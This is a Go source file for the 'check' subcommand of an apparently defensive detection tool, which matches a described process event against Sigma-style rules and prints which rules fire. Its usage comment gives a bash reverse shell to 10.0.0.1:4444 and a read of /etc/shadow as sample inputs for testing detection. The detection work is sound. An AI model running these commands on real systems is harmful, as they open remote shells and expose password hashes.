package main

import (
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"sort"
	"strings"

	"github.com/conor-sometimes/banken/internal/event"
	"github.com/conor-sometimes/banken/internal/sigma"
)

// runCheck is the `banken check` subcommand: the detection engineer's / purple
// teamer's fast path. Describe one event -- a command line, field flags, or a
// full JSON event -- and it prints which rules fire, without touching a log or
// the cursor. The baseline rules are always loaded; -rules adds more.
//
//	banken check 'cat /etc/shadow'
//	banken check -image /bin/bash 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
//	banken check -json '{"image":"/usr/bin/curl","commandLine":"curl http://1.2.3.4"}'
func runCheck(args []string, stdout, stderr io.Writer) error {
	fs := flag.NewFlagSet("banken check", flag.ContinueOnError)
	fs.SetOutput(stderr)
	var f struct {
		image, user, target, parent, cwd, jsonStr, rules string
	}
	fs.StringVar(&f.image, "image", "", "Image: the executable path")
	fs.StringVar(&f.user, "user", "", "User")
	fs.StringVar(&f.target, "target", "", "TargetFilename")
	fs.StringVar(&f.parent, "parent", "", "ParentImage")
	fs.StringVar(&f.cwd, "cwd", "", "CurrentDirectory")
	fs.StringVar(&f.jsonStr, "json", "", "a full event as JSON (overrides the field flags)")
	fs.StringVar(&f.rules, "rules", "", "comma-separated extra rule dirs (on top of the baseline)")
	fs.Usage = func() {
		logln(stderr, "usage: banken check [flags] [command line...]")
		fs.PrintDefaults()
	}
	if err := fs.Parse(args); err != nil {
		return err
	}

	ev, err := checkEvent(f.jsonStr, f.image, f.user, f.target, f.parent, f.cwd, fs.Args())
	if err != nil {
		return err
	}

	rules, problems := loadRules(splitComma(f.rules))
	for _, p := range problems {
		logAt(stderr, levelErr, "banken: rule error: %s", p.Error())
	}
	if len(rules) == 0 {
		return errors.New("no rules loaded")
	}

	hits := sigma.NewMatcher(rules).Match(ev)
	if len(hits) == 0 {
		logf(stdout, "no rules matched (%d loaded)\n", len(rules))
		return nil
	}
	sort.Slice(hits, func(i, j int) bool { return hits[i].Name < hits[j].Name })
	logf(stdout, "%d of %d rules matched:\n", len(hits), len(rules))
	for _, r := range hits {
		level := r.Level
		if level == "" {
			level = "medium"
		}
		title := r.Title
		if title == "" {
			title = "(no title)"
		}
		logf(stdout, "  [%-8s] %-32s %s\n", level, r.Name, title)
	}
	return nil
}

// checkEvent builds the event to test from a JSON blob (if given) or the field
// flags plus any positional words joined as the command line.
func checkEvent(jsonStr, image, user, target, parent, cwd string, words []string) (event.Event, error) {
	if jsonStr != "" {
		var ev event.Event
		if err := json.Unmarshal([]byte(jsonStr), &ev); err != nil {
			return event.Event{}, fmt.Errorf("bad -json: %w", err)
		}
		return ev, nil
	}
	return event.Event{
		Image:            image,
		CommandLine:      strings.Join(words, " "),
		User:             user,
		TargetFilename:   target,
		ParentImage:      parent,
		CurrentDirectory: cwd,
	}, nil
}
